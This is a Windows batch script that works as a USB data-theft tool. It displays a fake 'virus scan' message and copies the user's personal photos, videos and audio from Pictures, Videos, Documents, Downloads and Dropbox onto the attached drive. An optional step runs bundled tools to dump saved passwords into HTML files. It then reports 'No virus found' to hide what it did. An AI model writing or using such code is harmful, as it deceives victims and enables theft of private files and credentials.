@echo off

REM ###############################################################
REM ######################### OPTIONS #############################
REM ###############################################################

set formats=*.jpg *.png *.mp4 *.3gp *.wav
set msg1=true
set msg2=true
set msg1text=Analyzing USB device for searching virus.
set msg2text=No virus found.
set stealfiles=true
set nirsoft=false
set soft=

REM ---------------------------------------------------------------

REM ###############################################################
REM ############ DON'T TOUCH THIS, ONLY ADVANCED USERS ############
REM ###############################################################

set drives=B D E F G H I J K L M N O P Q R S T U V W X Y Z

IF %msg1%==true (
	MSG * %msg1text%
)

IF %stealfiles%==true (
	MKDIR data\capt\%USERNAME%
	FOR %%# IN (%DRIVES%) DO (IF Exist "%%#:\" (
		FOR /R "%userprofile%\Pictures\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
		FOR /R "%userprofile%\Videos\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
		FOR /R "%userprofile%\Documents\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
		FOR /R "%userprofile%\Downloads\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
		FOR /R "%userprofile%\Dropbox\" %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
	))
)

IF %nirsoft%==true (
	MKDIR data\pss\%USERNAME%
	FOR %%I IN (%soft%) DO (
		start data/soft/%%I.exe /shtml "data\pss\%USERNAME%\%%I.html"
	)
)

IF %msg2%==true (
	MSG * %msg2text%
)

exit